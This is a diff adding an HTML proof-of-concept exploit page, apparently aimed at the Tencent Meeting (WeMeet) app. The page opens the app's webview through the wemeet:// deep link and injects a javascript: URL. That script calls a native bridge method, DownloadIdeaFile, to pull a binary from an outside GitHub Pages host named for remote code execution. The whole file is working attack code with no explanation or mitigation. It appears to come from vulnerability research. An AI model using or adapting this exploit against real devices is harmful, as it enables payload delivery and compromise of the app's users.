@@ -1,0 +1,18 @@
+<!doctype html>
+<html><head><meta charset="utf-8"><title>WM-POC-OK</title></head>
+<body><h1>WM-POC-P40E</h1>
+<script>
+document.title='P40E-START';
+var official='https://meeting.tencent.com/v2/webview/keep-app-alive';
+var js="javascript:void(function(){document.title='P40EINJ:'+location.host;window.__p=function(r){try{r=typeof r==='string'?JSON.parse(r):r}catch(e){}document.title='P40ECB:'+(r&&r.callId)+':'+(r&&r.code)+':'+String(JSON.stringify(r&&r.data||{})).slice(0,80)};window.JSCallJavaMgr.JSCallNative(JSON.stringify({callback:'window.__p',module:'IdeaWebViewPlugin',method:'DownloadIdeaFile',param:{url:'https://gitwhs.github.io/wm-poc-rce/p40.bin',idea_id:'1',content_type:'application/octet-stream',idea_title:'p40e',meeting_code:'0'},callId:'I1'}))})()";
+function frame(src, label){
+  document.title=label;
+  var f=document.createElement('iframe');
+  f.src=src;
+  document.body.appendChild(f);
+}
+setTimeout(function(){ frame('wemeet://page/web_app?url='+encodeURIComponent(official),'P40E-OFFICIAL'); }, 400);
+setTimeout(function(){ frame('wemeet://page/web_app?url='+encodeURIComponent(js),'P40E-JSINJ'); }, 8000);
+setTimeout(function(){ document.title='P40E-DONE'; }, 22000);
+</script>
+</body></html>
